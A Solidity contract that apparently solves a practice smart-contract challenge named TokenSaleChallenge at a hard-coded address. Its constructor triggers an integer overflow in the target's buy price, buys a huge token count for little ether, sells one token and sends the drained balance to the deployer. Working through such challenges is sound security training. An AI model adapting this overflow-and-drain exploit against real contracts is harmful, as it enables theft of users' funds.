pragma solidity ^0.8.0;

interface TokenSaleChallenge {
    function buy(uint256 numTokens) external payable;

    function sell(uint256 numTokens) external;
}

contract TokenSaleAttack {
    address private constant tokenSaleChallengeAddress =
        0x506f510B43E8d8887d7558cd05656fbdc6D2D57C;
    uint256 private constant UINT_MAX = type(uint256).max;

    constructor() payable {
        unchecked {
            uint256 numberOfTokensToRequest = (UINT_MAX / 1 ether) + 1;
            uint256 weiToSend = numberOfTokensToRequest * 1 ether;
            TokenSaleChallenge(tokenSaleChallengeAddress).buy{value: weiToSend}(
                numberOfTokensToRequest
            );
        }
        TokenSaleChallenge(tokenSaleChallengeAddress).sell(1);
        withdraw(msg.sender);
    }

    function withdraw(address to) private {
        uint256 amount = address(this).balance;
        (bool success, ) = to.call{value: amount}("");
        require(success, "Failed to send Ether");
    }
}
